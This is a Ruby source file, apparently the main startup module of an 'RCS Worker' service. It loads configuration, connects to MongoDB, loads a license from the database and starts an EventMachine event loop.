  # The main file of the worker
require 'rcs-common/path_utils'

# relatives
require_relative 'call_processor'
require_relative 'statistics'
require_relative 'events'

require_release 'rcs-db/config'
require_release 'rcs-db/db_layer'
require_release 'rcs-db/license_component'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/component'

# from bundle
require 'eventmachine'

module RCS
  module Worker
    class Application
      include RCS::Component

      component :worker, name: "RCS Worker"

      def run(options)
        run_with_rescue do
          trace_setup

          # config file parsing
          return 1 unless RCS::DB::Config.instance.load_from_file

          # connect to MongoDB
          establish_database_connection(wait_until_connected: true)

          # load the license from the db (saved by db)
          LicenseManager.instance.load_from_db

          # Start the eventmachine reactor threads
          Events.new.setup(RCS::DB::Config.instance.global['LISTENING_PORT']-1)
        end
      end
    end
  end # Worker::
end # RCS::
